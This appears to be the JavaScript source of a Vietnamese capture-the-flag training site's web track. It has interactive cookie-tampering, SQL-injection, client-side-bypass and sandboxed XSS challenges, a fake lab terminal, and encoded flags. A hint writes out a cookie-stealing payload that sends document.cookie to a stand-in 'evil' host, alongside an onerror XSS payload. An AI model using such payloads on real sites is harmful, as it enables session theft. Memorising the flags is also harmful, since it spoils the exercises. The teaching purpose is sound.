/* Widget cho track Web */
const WEB_SECRETS = { wb2: "ekNURntjMDBrMTNfZDNfczRvfQ==", wb3: "ekNURnswcl8xX2I0bmdfMX0=" };

function mountCookie(el) {
  const KEY = "zctf_role";
  document.cookie = `${KEY}=guest; path=/; SameSite=Lax`;
  const cookieOK = document.cookie.includes(KEY + "=");
  if (!cookieOK) {
    try { if (!localStorage.getItem(KEY)) localStorage.setItem(KEY, "guest"); } catch {}
  }
  const getRole = () => {
    if (cookieOK) {
      const m = document.cookie.match(new RegExp("(?:^|; )" + KEY + "=([^;]*)"));
      return m ? decodeURIComponent(m[1]) : "";
    }
    try { return localStorage.getItem(KEY) || ""; } catch { return ""; }
  };
  const root = h(`
    <div class="window fake-browser" style="margin-top:12px">
      <div class="window-bar"><i></i><i></i><i></i><span>https://bank.zctf.local/admin</span></div>
      <div class="fake-page">
        <h5>Bảng điều khiển quản trị</h5>
        <div class="res">Bấm nút để tải bảng điều khiển.</div>
        <button type="button">Tải trang</button>
        <div style="margin-top:10px;font-size:12px;color:#7a8596">${cookieOK ? "" : "Bạn đang mở file trực tiếp nên trang dùng Local Storage thay cho cookie. Chạy qua server (xem README) để dùng cookie thật."}</div>
      </div>
    </div>`);
  el.replaceWith(root);
  const res = root.querySelector(".res");
  root.querySelector("button").addEventListener("click", () => {
    const role = getRole();
    if (role === "admin") {
      res.innerHTML = `<span style="color:#0a8a4a">✓ Xin chào admin. Flag: <b>${d64(WEB_SECRETS.wb2)}</b></span>`;
    } else {
      res.innerHTML = `<span style="color:#c0283f">✗ 403 Forbidden: vai trò hiện tại là "<b>${esc(role || "(trống)")}</b>", cần "admin".</span>`;
    }
  });
}

function mountSqli(el) {
  const USERS = [
    { id: 1, username: "admin", password: "S!eu_Bi_Mat_9f3k2" },
    { id: 2, username: "guest", password: "guest" },
  ];
  const root = h(`
    <div>
      <div class="window fake-browser" style="margin-top:12px">
        <div class="window-bar"><i></i><i></i><i></i><span>https://shop.zctf.local/login</span></div>
        <form class="fake-page" autocomplete="off">
          <h5>Đăng nhập</h5>
          <label>Username</label><input name="u" spellcheck="false">
          <label>Password</label><input name="p" type="text" spellcheck="false">
          <button type="submit">Đăng nhập</button>
          <div class="res"></div>
        </form>
      </div>
      <div class="sql-preview"></div>
    </div>`);
  el.replaceWith(root);
  const form = root.querySelector("form");
  const pre = root.querySelector(".sql-preview");
  const res = root.querySelector(".res");

  const build = () => `SELECT * FROM users WHERE username = '${form.u.value}' AND password = '${form.p.value}'`;
  const preview = () => {
    const u = form.u.value, p = form.p.value;
    let html = `SELECT * FROM users WHERE username = '<span class="u">${esc(u)}</span>' AND password = '<span class="u">${esc(p)}</span>'`;
    const q = build();
    const ci = commentIndex(q);
    if (ci >= 0) {
      // làm mờ phần bị comment: vẽ lại theo vị trí
      const before = q.slice(0, ci), after = q.slice(ci);
      html = esc(before) + `<span class="cmt">${esc(after)}</span>`;
    }
    pre.innerHTML = html;
  };

  function commentIndex(q) {
    let inStr = false;
    for (let i = 0; i < q.length; i++) {
      const ch = q[i];
      if (ch === "'") {
        if (inStr && q[i + 1] === "'") { i++; continue; }
        inStr = !inStr;
      } else if (!inStr && (ch === "#" || (ch === "-" && q[i + 1] === "-"))) return i;
    }
    return -1;
  }

  function tokenize(q) {
    const toks = [];
    let i = 0;
    while (i < q.length) {
      const ch = q[i];
      if (/\s/.test(ch)) { i++; continue; }
      if (ch === "#" || (ch === "-" && q[i + 1] === "-")) break;
      if (ch === "/" && q[i + 1] === "*") { const e = q.indexOf("*/", i + 2); i = e < 0 ? q.length : e + 2; continue; }
      if (ch === "'") {
        let s = "", j = i + 1, closed = false;
        while (j < q.length) {
          if (q[j] === "'" && q[j + 1] === "'") { s += "'"; j += 2; continue; }
          if (q[j] === "'") { closed = true; break; }
          s += q[j++];
        }
        if (!closed) throw `unrecognized token: "'${s.slice(0, 20)}"`;
        toks.push({ t: "str", v: s }); i = j + 1; continue;
      }
      if (/[0-9]/.test(ch)) { let j = i; while (/[0-9]/.test(q[j])) j++; toks.push({ t: "num", v: Number(q.slice(i, j)) }); i = j; continue; }
      if (/[A-Za-z_*]/.test(ch)) { let j = i; while (j < q.length && /[A-Za-z_0-9*]/.test(q[j])) j++; toks.push({ t: "id", v: q.slice(i, j) }); i = j; continue; }
      const two = q.slice(i, i + 2);
      if (["!=", "<>", "<=", ">=", "||"].includes(two)) { toks.push({ t: "op", v: two === "||" ? "OR" : two === "<>" ? "!=" : two }); i += 2; continue; }
      if ("=<>(),;".includes(ch)) { toks.push({ t: "op", v: ch }); i++; continue; }
      throw `near "${ch}": syntax error`;
    }
    return toks;
  }

  function query(q) {
    const toks = tokenize(q);
    let p = 0;
    const peek = () => toks[p];
    const isKw = (k) => peek() && peek().t === "id" && peek().v.toUpperCase() === k;
    const expectKw = (k) => { if (!isKw(k)) throw `near "${peek() ? peek().v : "EOF"}": syntax error`; p++; };
    expectKw("SELECT"); p++; expectKw("FROM"); p++; expectKw("WHERE");
    const whereStart = p;
    const rows = USERS.filter((row) => {
      p = whereStart;
      const v = parseOr(row);
      if (p < toks.length && !(toks[p].t === "op" && toks[p].v === ";")) throw `near "${toks[p].v}": syntax error`;
      return truthy(v);
    });
    return rows;

    function truthy(v) { return typeof v === "number" ? v !== 0 : (parseFloat(v) || 0) !== 0; }
    function parseOr(row) { let l = parseAnd(row); while (isKw("OR")) { p++; const r = parseAnd(row); l = truthy(l) || truthy(r) ? 1 : 0; } return l; }
    function parseAnd(row) { let l = parseNot(row); while (isKw("AND")) { p++; const r = parseNot(row); l = truthy(l) && truthy(r) ? 1 : 0; } return l; }
    function parseNot(row) { if (isKw("NOT")) { p++; return truthy(parseNot(row)) ? 0 : 1; } return parseCmp(row); }
    function parseCmp(row) {
      const l = parseAtom(row);
      const t = peek();
      if (t && t.t === "op" && ["=", "!=", "<", ">", "<=", ">="].includes(t.v)) {
        p++;
        const r = parseAtom(row);
        const a = typeof l === "number" || typeof r === "number" ? Number(l) : l;
        const b = typeof l === "number" || typeof r === "number" ? Number(r) : r;
        return { "=": a == b, "!=": a != b, "<": a < b, ">": a > b, "<=": a <= b, ">=": a >= b }[t.v] ? 1 : 0;
      }
      if (isKw("LIKE")) { p++; const r = parseAtom(row); const re = new RegExp("^" + String(r).replace(/[.*+?^${}()|[\]\\]/g, "\\$&").replace(/%/g, ".*").replace(/_/g, ".") + "$", "i"); return re.test(String(l)) ? 1 : 0; }
      return l;
    }
    function parseAtom(row) {
      const t = toks[p++];
      if (!t) throw "incomplete input";
      if (t.t === "str" || t.t === "num") return t.v;
      if (t.t === "op" && t.v === "(") { const v = parseOr(row); if (!(peek() && peek().v === ")")) throw "near \"(\": syntax error"; p++; return v; }
      if (t.t === "id") {
        const k = t.v.toLowerCase();
        if (k === "true") return 1;
        if (k === "false") return 0;
        if (k in row) return row[k];
        throw `no such column: ${t.v}`;
      }
      throw `near "${t.v}": syntax error`;
    }
  }

  form.addEventListener("input", preview);
  form.addEventListener("submit", (e) => {
    e.preventDefault();
    try {
      const rows = query(build());
      if (!rows.length) res.innerHTML = `<span style="color:#c0283f">Sai username hoặc mật khẩu.</span>`;
      else if (rows[0].username === "admin") res.innerHTML = `<span style="color:#0a8a4a">✓ Đăng nhập thành công với <b>admin</b>. Flag: <b>${d64(WEB_SECRETS.wb3)}</b></span>`;
      else res.innerHTML = `<span style="color:#b07a00">Đăng nhập với <b>${esc(rows[0].username)}</b>. Không có gì thú vị ở đây, flag chỉ dành cho admin.</span>`;
    } catch (err) {
      res.innerHTML = `<span style="color:#c0283f">SQLite error: ${esc(String(err))}</span>`;
    }
  });
  preview();
}


/* ---- web-recon: bypass kiểm tra phía client ---- */
const CLIENT_FLAG = "ekNURntieXBhc3NfY2hlY2tfcGgxYV9jbGllbnR9"; // zCTF{bypass_check_ph1a_client}
function mountClientAuth(el) {
  addStyle("web-clientauth", `
    .ca-src { margin: 12px 0 0; }
    .ca-src summary { cursor: pointer; color: var(--cyan); font-size: 13.5px; }
    .ca-src pre { margin: 8px 0 0; }`);
  const root = h(`
    <div>
      <div class="window fake-browser" style="margin-top:12px">
        <div class="window-bar"><i></i><i></i><i></i><span>https://vault.zctf.local/unlock</span></div>
        <form class="fake-page" autocomplete="off">
          <h5>Két sắt — nhập mật khẩu</h5>
          <label>Mật khẩu</label><input name="pw" spellcheck="false">
          <button type="submit">Mở</button>
          <div class="res"></div>
        </form>
      </div>
      <details class="ca-src"><summary>Xem mã nguồn trang (app.js — tải về cùng trang web)</summary>
        <pre class="code" data-lang="javascript"><code>// Toàn bộ việc kiểm tra chạy NGAY TRONG TRÌNH DUYỆT của bạn.
function check(pw) {
  // so với mật khẩu đã "giấu"
  return btoa(pw.split('').reverse().join('')) === "eWFnbl9hb2hrXzBt";
}</code></pre></details>
    </div>`);
  el.replaceWith(root);
  const form = root.querySelector("form"), res = root.querySelector(".res");
  const check = (pw) => btoa([...pw].reverse().join("")) === "eWFnbl9hb2hrXzBt";
  form.addEventListener("submit", (e) => {
    e.preventDefault();
    if (check(form.pw.value)) res.innerHTML = `<span style="color:#0a8a4a">✓ Két mở! Flag: <b>${d64(CLIENT_FLAG)}</b></span>`;
    else res.innerHTML = `<span style="color:#c0283f">✗ Sai mật khẩu. (Nhưng hàm check nằm ngay trên kia...)</span>`;
  });
}

/* ---- web-xss: sandbox an toàn, phát hiện alert() và lấy cookie ----
   Payload chạy trong iframe sandbox="allow-scripts" (origin rỗng, KHÔNG chạm được trang cha).
   Mọi liên lạc ra ngoài chỉ qua postMessage mà ta dựng sẵn. */
function mountXss(el) {
  const mode = el.dataset.mode || "alert";
  addStyle("web-xss", `
    .xss-box { margin: 12px 0; }
    .xss-box textarea { width: 100%; min-height: 70px; resize: vertical; padding: 12px 14px; border-radius: 10px; background: #06080b; border: 1px solid var(--border-2); color: var(--text); font-family: var(--mono); font-size: 13.5px; outline: none; }
    .xss-box textarea:focus { border-color: var(--accent); }
    .xss-victim { margin-top: 10px; border: 1px solid var(--border); border-radius: 10px; background: #fff; }
    .xss-victim .vbar { font-family: var(--mono); font-size: 12px; color: #5a6677; padding: 6px 12px; border-bottom: 1px solid #e3e8ef; background: #f5f7fa; border-radius: 10px 10px 0 0; }
    .xss-victim iframe { width: 100%; height: 120px; border: 0; display: block; }
    .xss-log { margin-top: 10px; font-family: var(--mono); font-size: 13px; }`);
  const flagHint = mode === "cookie"
    ? 'Cookie nạn nhân nằm ở <code>document.cookie</code>. Gửi nó về "kẻ tấn công" bằng một ảnh: <code>new Image().src="//evil/?c="+document.cookie</code>.'
    : 'Làm cho <code>alert()</code> chạy trong trang nạn nhân. Gợi ý: <code>&lt;script&gt;</code> chèn qua innerHTML KHÔNG chạy — hãy dùng sự kiện như <code>&lt;img src=x onerror=...&gt;</code>.';
  const root = h(`
    <div class="xss-box">
      <label style="font-family:var(--mono);font-size:12px;color:var(--dim)">BÌNH LUẬN CỦA BẠN (sẽ bị chèn thẳng vào trang nạn nhân, không lọc)</label>
      <textarea spellcheck="false" placeholder="${mode === "cookie" ? '<img src=x onerror="...">' : '<img src=x onerror=alert(1)>'}"></textarea>
      <div style="margin-top:8px"><button class="btn primary sm">Đăng bình luận</button></div>
      <p style="font-size:13.5px;color:var(--muted);margin:10px 0 0">${flagHint}</p>
      <div class="xss-victim"><div class="vbar">🌐 Trình duyệt của nạn nhân — https://blog.zctf.local/post/1</div><iframe></iframe></div>
      <div class="xss-log"></div>
    </div>`);
  el.replaceWith(root);
  const ta = root.querySelector("textarea"), frame = root.querySelector("iframe"), log = root.querySelector(".xss-log");
  const token = "xss-" + Math.random().toString(36).slice(2);
  const FLAG = mode === "cookie" ? "ekNURnt4NTVfbDR5X3RyMG1fYzAwazEzfQ==" : "ekNURnt4NTVfYWxlcnRfdGg0bmhfYzBuZ30=";
  const srcdoc = `<!doctype html><html><body style="font-family:sans-serif;margin:10px;color:#1b2330">
<h4 style="margin:0 0 6px">Bài viết #1</h4><div>Bình luận:</div><div id="cmt"></div>
<script>
  var _c = "session=` + d64(FLAG) + `";
  try { Object.defineProperty(document, "cookie", { get: function(){ return _c; }, set: function(){}, configurable: true }); } catch(e){}
  var cookie = _c;
  var TOKEN = ${JSON.stringify(token)};
  function report(kind, data){ parent.postMessage({__xss: TOKEN, kind: kind, data: String(data)}, "*"); }
  var _alert = window.alert; window.alert = function(x){ report("alert", x); };
  // Chặn mọi "mạng" ra ngoài để mô phỏng kẻ tấn công thu thập — AN TOÀN, không gửi đi đâu thật
  window.Image = function(){ var o = {}; Object.defineProperty(o, "src", { set: function(v){ report("net", v); } }); return o; };
  window.fetch = function(u){ report("net", u); return new Promise(function(){}); };
  addEventListener("message", function(e){
    if(!e.data || e.data.__set !== TOKEN) return;
    try { document.getElementById("cmt").innerHTML = e.data.html; }
    catch(err) { report("err", err); }
  });
<\/script></body></html>`;
  let solved = false;
  const onMsg = (e) => {
    if (e.source !== frame.contentWindow || !e.data || e.data.__xss !== token) return;
    if (solved) return;
    if (mode === "alert" && e.data.kind === "alert") { win(`alert() đã chạy với giá trị "${esc(e.data.data)}"`); }
    else if (mode === "cookie" && e.data.kind === "net" && e.data.data.includes(d64(FLAG))) { win(`Cookie đã bị gửi ra ngoài: <code>${esc(e.data.data)}</code>`); }
    else if (e.data.kind === "net") { log.innerHTML = `<span style="color:var(--amber)">Có request ra ngoài: <code>${esc(e.data.data)}</code> — nhưng chưa thấy cookie trong đó.</span>`; }
    else if (e.data.kind === "alert") { log.innerHTML = `<span style="color:var(--amber)">alert() chạy rồi, nhưng thử thách này cần lấy cookie.</span>`; }
  };
  function win(msg) {
    solved = true;
    log.innerHTML = `<span style="color:var(--accent)">✓ ${msg}<br>Flag: <b>${d64(FLAG)}</b></span>`;
  }
  addEventListener("message", onMsg);
  const mo = new MutationObserver(() => { if (!document.body.contains(root)) { removeEventListener("message", onMsg); mo.disconnect(); } });
  mo.observe(document.body, { childList: true, subtree: true });
  frame.setAttribute("sandbox", "allow-scripts");
  frame.srcdoc = srcdoc;
  root.querySelector("button").addEventListener("click", () => {
    log.textContent = "";
    // nạp lại victim rồi gửi payload
    frame.srcdoc = srcdoc;
    frame.onload = () => { frame.contentWindow.postMessage({ __set: token, html: ta.value }, "*"); frame.onload = null; };
  });
}

WIDGETS.clientauth = mountClientAuth;
WIDGETS.xss = mountXss;

WIDGETS.cookie = mountCookie;
WIDGETS.sqli = mountSqli;

/* ---- Terminal cho track web: curl sẵn sàng gọi các lab ---- */
SHELL_FS.web = {
  user: "hacker", host: "kali",
  motd: 'Terminal có <span class="hl">curl</span>. Các lab chạy ở <span class="hl">http://lab.zctf.local/lab/&lt;tên&gt;/</span>. Đọc <span class="hl">cat targets.txt</span>.',
  fs: () => SH.base({
    "targets.txt": SH.file(
      "Danh sach lab (dung curl de tan cong):\n" +
      "  http://lab.zctf.local/lab/web_http/     — method, header, cookie, redirect\n" +
      "  http://lab.zctf.local/lab/web_recon/    — robots.txt, file backup lo\n" +
      "  http://lab.zctf.local/lab/web_sqli/     — SQL injection (sqlite that)\n" +
      "  http://lab.zctf.local/lab/web_auth/     — IDOR, JWT\n" +
      "  http://lab.zctf.local/lab/web_server/   — path traversal, SSTI, cmd injection\n" +
      "\nMeo curl:  -i (xem header)  -X POST  -b 'k=v' (cookie)  -d 'a=b' (body)\n" +
      "           -H 'Name: value'  -L (theo redirect)  -A ua (user-agent)\n",
      { owner: "hacker" }),
  }, "hacker"),
};
